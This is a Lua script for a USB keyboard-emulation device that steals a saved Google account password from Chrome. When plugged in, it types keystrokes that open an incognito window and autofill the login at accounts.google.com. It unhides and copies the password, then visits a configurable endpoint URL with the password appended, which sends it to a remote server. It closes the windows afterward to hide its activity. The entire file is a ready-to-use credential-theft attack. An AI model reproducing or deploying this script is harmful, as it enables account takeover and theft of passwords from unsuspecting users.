---
--- expose saved Google account password from Chrome
---
require("common")

kb = luausb.create({ id = 0, type = "keyboard" })

-- This URL will be visited with the captured password appended to the end
local endpoint = prompt("Endpoint querystring", "https://localhost/index.php?q=")

while true do
    print("idle")

    -- poll until usb plugged in
    while luausb.state() == "not attached" do
        wait(1000)
    end

    print("running")
    -- wait 1 second for things to settle down
    wait(1000)

    -- open chrome
    kb.chord(MOD_LSUPER, KEY_R)
    wait(1000)
    kb.string("chrome\n")
    wait(2000)

    -- open incognito window
    kb.chord({ MOD_LCTRL, MOD_LSHIFT }, KEY_N)
    wait(2000)

    -- navigate to login page
    kb.string("accounts.google.com\n")
    wait(2000)

    -- autofill username and continue
    kb.press(KEY_DOWN)
    wait(100)
    kb.press(KEY_ENTER)
    wait(100)
    kb.press(KEY_ENTER)
    wait(2000)

    -- autofill password
    kb.press(KEY_DOWN)
    wait(100)
    kb.press(KEY_DOWN)
    wait(100)
    kb.press(KEY_ENTER)
    wait(100)
    -- unhide password
    kb.press(KEY_TAB)
    wait(100)
    kb.press(KEY_ENTER)
    wait(100)
    -- copy password to clipboard
    kb.chord(MOD_LSHIFT, KEY_TAB)
    wait(100)
    kb.chord(MOD_LCTRL, KEY_C)
    wait(100)

    -- open new tab and navigate to query string with captured password
    kb.chord(MOD_LCTRL, KEY_T)
    wait(1000)
    kb.string(endpoint)
    kb.chord(MOD_LCTRL, KEY_V)
    kb.press(KEY_ENTER)
    wait(2000)

    -- close everything we opened
    kb.chord(MOD_LALT, KEY_F4)
    wait(1000)
    kb.chord(MOD_LALT, KEY_F4)
    wait(1000)

    print("done")
    -- poll until usb unplugged
    while luausb.state() == "configured" do
        wait(1000)
    end
    print("disconnected")
end

